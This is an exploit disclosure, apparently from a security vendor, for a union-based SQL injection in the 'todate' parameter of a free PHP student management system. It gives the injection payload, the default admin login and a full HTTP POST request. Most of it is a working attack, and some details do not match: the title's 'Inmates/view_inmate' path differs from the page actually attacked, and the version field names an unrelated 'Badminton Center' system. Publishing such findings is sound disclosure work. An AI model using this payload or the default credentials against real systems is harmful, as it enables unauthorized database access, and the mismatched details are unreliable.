# Online student management system  - Inmates/view_inmate 'todate' SQL inject(SQLI)


#### Exploit Title: Online student management system  - Inmates/view_inmate 'todate' SQL inject(SQLI)
#### Exploit Author: webraybtl@webray.com.cn inc
#### Vendor Homepage: https://www.sourcecodester.com/php/16137/online-student-management-system-php-free-download.html
#### Software Link:https://www.sourcecodester.com/download-code?nid=16137&title=Online+student+management+system+in+php+free+download
#### Version: Badminton Center Management System
#### Tested on: Windows Server 2008 R2 Enterprise, Apache ,Mysql

#### Description
The reason for the SQL injection vulnerability is that the website application does not verify the validity of the data submitted by the user to the server (type, length, business parameter validity, etc.), and does not effectively filter the data input by the user with special characters , so that the user's input is directly brought into the database for execution, which exceeds the expected result of the original design of the SQL statement, resulting in a SQL injection vulnerability.Online student management system does not filter the content correctly at the "Inmates/view_inmate" todate parameter, resulting in the generation of SQL injection.

#### Payload used:

`fromdate=2023-01-01&todate=1'and 1=2 union select '1','2',database(),version(),'5','6','7'-- &submit=`

#### Proof of Concept

1. Login the CMS. 
   Admin Default Access:

   Username : mayurik
   Password : rootadmin

2. Open Page http://192.168.67.10/between-dates-reports.php

   ![image-20231218162942733](img/Online student management system(SQLI)/image-20231218162942733.png)

   

3. Put SQL payload   in the BURP;

   ![image-20231218163013713](img/Online student management system(SQLI)/image-20231218163013713.png)

   ```
   POST /between-date-reprtsdetails.php HTTP/1.1
   Host: 192.168.67.10
   User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0
   Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
   Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
   Accept-Encoding: gzip, deflate
   Content-Type: application/x-www-form-urlencoded
   Content-Length: 101
   Origin: http://192.168.67.10
   Connection: close
   Referer: http://192.168.67.10/between-dates-reports.php
   Cookie: PHPSESSID=41k6lb8lgvu5aiq908id5u1qgh
   Upgrade-Insecure-Requests: 1
   
   fromdate=2023-01-01&todate=1'and 1=2 union select '1','2',database(),version(),'5','6','7'-- &submit=
   ```

   


4. Viewing the Response;

   

![image-20231218163108092](img/Online student management system(SQLI)/image-20231218163108092.png)

![image-20231218163057715](img/Online student management system(SQLI)/image-20231218163057715.png)



